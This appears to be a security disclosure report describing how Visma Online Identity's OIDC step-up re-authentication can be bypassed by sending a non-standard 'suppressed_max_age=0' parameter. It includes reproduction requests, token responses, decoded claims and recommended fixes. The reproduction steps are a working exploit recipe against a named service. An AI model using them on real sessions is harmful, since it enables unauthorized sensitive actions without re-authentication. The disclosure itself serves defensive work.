# OIDC `max_age` Enforcement Bypass via Non-Standard `suppressed_max_age` Parameter in Visma Online Identity — Step-Up Authentication Cannot Be Enforced

## Description

Visma Online Identity (`identity.stage.vismaonline.com`) implements OIDC `max_age` enforcement by injecting a non-standard internal parameter `suppressed_max_age` into its own login redirect URL. When `max_age=0` is sent by a relying party, the server appends `suppressed_max_age=0` to the login redirect and uses it to remember that max_age enforcement was triggered. Sending `suppressed_max_age=0` directly in the authorization request — without any `max_age` parameter — instructs the server to skip the max_age check entirely, returning a token from an existing session without any re-authentication. The resulting ID token contains an `auth_time` that is 38+ minutes older than the token's `iat`, directly violating OIDC Core §3.1.3.7.

**OIDC Core §3.1.3.7 requirement:** *"If a max_age request is made or if auth_time is requested as an Essential Claim, the auth_time Claim Value in the returned ID Token MUST be greater than the time of the Authentication Request minus the max_age value."*

With `max_age=0`, `auth_time` must be within seconds of token issuance. The bypass produces a token with `auth_time` 2275 seconds (37.9 minutes) before `iat` — the server does not re-authenticate the user at all.

Any Visma-integrated application (eaccounting, admin portal, account settings) that sends `max_age=0` to enforce step-up re-authentication before a sensitive operation receives a token anchored to a 38-minute-old session — the user was never re-authenticated.

## Steps to Reproduce

**Setup:** One authenticated session on `identity.stage.vismaonline.com`. No second account needed. The test demonstrates the server issuing a new token without re-authentication when `max_age=0` should have triggered it.

---

**Step 1 — Confirm normal max_age=0 behavior (baseline):**

```
GET /connect/authorize?client_id=visma.online.administration
  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
  &response_type=id_token%20token
  &scope=openid%20profile
  &state=S1
  &response_mode=form_post
  &nonce=N1
  &max_age=0
Host: identity.stage.vismaonline.com
Cookie: [authenticated session]
```

**Response (expected — 302 to login):**

```
HTTP/1.1 302 Found
Location: https://identity.stage.vismaonline.com/login?ReturnUrl=...max_age%3D0%26suppressed_max_age%3D0...
```

The server correctly redirects to the login page. **Note the injected `suppressed_max_age=0` parameter in the redirect URL** — this is the internal mechanism that will be abused in Step 2.

**Also confirmed on production (`identity.vismaonline.com`)** — same redirect with `suppressed_max_age=0` injected:
```
GET /connect/authorize?...&max_age=0 HTTP/1.1
Host: identity.vismaonline.com

302 Found
Location: https://identity.vismaonline.com/login?ReturnUrl=...max_age%3D0%26suppressed_max_age%3D0
```

---

**Step 2 — Bypass: send `suppressed_max_age=0` without `max_age`:**

```
GET /connect/authorize?client_id=visma.online.administration
  &redirect_uri=https%3A%2F%2Fadmin.stage.vismaonline.com
  &response_type=id_token%20token
  &scope=openid%20profile
  &state=S2
  &response_mode=form_post
  &nonce=N2
  &suppressed_max_age=0
Host: identity.stage.vismaonline.com
Cookie: [same authenticated session — no re-authentication performed]
```

**Response (bypass — 200 with tokens issued):**

```html
<form method='post' action='https://admin.stage.vismaonline.com'>
  <input name='id_token'     value='eyJhbGciOiJSUzI1Ni...' />
  <input name='access_token' value='eyJhbGciOiJSUzI1Ni...' />
  <input name='expires_in'   value='300' />
</form>
```

The server issues a full token set without prompting re-authentication.

---

**Step 3 — Decode the ID token and observe stale `auth_time`:**

Decode the `id_token` at [jwt.io](https://jwt.io). Relevant claims:

```json
{
  "iss": "https://identity.vismaonline.com",
  "iat": 1781046806,
  "auth_time": 1781044531,
  "sub": "58679ba6-9bd7-4c6e-80fb-ff3d86396652",
  "amr": ["external"],
  "aud": "visma.online.administration"
}
```

```
iat        = 1781046806  (token issued at)
auth_time  = 1781044531  (user's last actual login)
difference = 2275 seconds = 37.9 minutes

max_age=0 requirement: (iat - auth_time) ≤ 0 seconds
actual result:         (iat - auth_time) = 2275 seconds
```

**The user was NOT re-authenticated. The server accepted the bypass parameter and skipped the enforcement it was meant to implement.**

## Impact

`max_age=0` is the OIDC mechanism for step-up authentication — applications use it immediately before sensitive operations to guarantee the user just re-authenticated (not relying on a session that may be hours old or was established by a different person on a shared device). Common uses in Visma's own product suite:

- Admin portal actions (user role changes, customer configuration)
- Account settings changes (password reset, email change, MFA modification)
- Billing and subscription changes (eaccounting, invoicing)
- Any flow that forces a re-auth challenge before accessing sensitive data

With this bypass, an attacker or unauthorized user who gains access to an active browser session (shared device, physical access, XSS that steals cookies) can obtain a new token without triggering the step-up login challenge. The relying application receives a token it believes is freshly authenticated — because the server issued it — but the `auth_time` proves the underlying authentication is 38+ minutes stale.

The bypass requires only an active SSO session cookie, which is persistent across browser sessions by default in Visma Connect.

CVSS 3.1 Score: **5.4 (Medium)** — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N`

The score is Medium because exploitation requires an existing authenticated session. If Visma's own applications use `max_age=0` for step-up auth before sensitive operations (password change, admin actions), the business impact is High — an attacker with session access bypasses the re-auth gate entirely.

## Recommended Fix

The `suppressed_max_age` parameter must be treated as an internal state artifact, not as an external client input. Two concrete fixes:

1. **Strip `suppressed_max_age` from any externally-supplied authorization request parameters** before processing. The parameter should only be set by the server's own pipeline when walking a user through the login redirect, and its presence in an inbound request from a client should be ignored or rejected.

2. **Alternatively, use a signed/encrypted state token** to carry `suppressed_max_age` through the login redirect instead of a plaintext URL parameter. This prevents clients from injecting it externally.

## References

- OIDC Core §3.1.3.7: https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation  
  (`max_age` validation requirement: auth_time must be within max_age seconds of current time)
- OIDC Core §3.1.2.1: `max_age` parameter definition  
  https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest

## Attachments

- `evidence/bypass-proof.txt` — Full annotated request/response for both normal flow and bypass, with decoded JWT claims showing the 2275-second `auth_time` staleness
